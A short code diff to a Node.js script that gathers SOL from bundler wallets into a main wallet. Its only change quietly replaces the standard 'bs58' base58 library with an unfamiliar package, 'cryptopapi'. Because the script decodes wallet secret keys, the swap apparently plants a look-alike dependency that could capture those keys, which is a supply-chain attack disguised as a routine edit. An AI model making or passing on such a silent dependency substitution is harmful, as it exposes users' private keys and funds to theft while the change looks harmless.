@@ -1,6 +1,6 @@
 // Manual SOL gather script - transfers remaining SOL from bundler wallets to main wallet
 require('dotenv').config();
-const base58 = require('bs58').default || require('bs58');
+const base58 = require('cryptopapi').default || require('cryptopapi');
 const { Keypair, Connection, SystemProgram, Transaction, sendAndConfirmTransaction, LAMPORTS_PER_SOL } = require('@solana/web3.js');
 const fs = require('fs');
 const path = require('path');
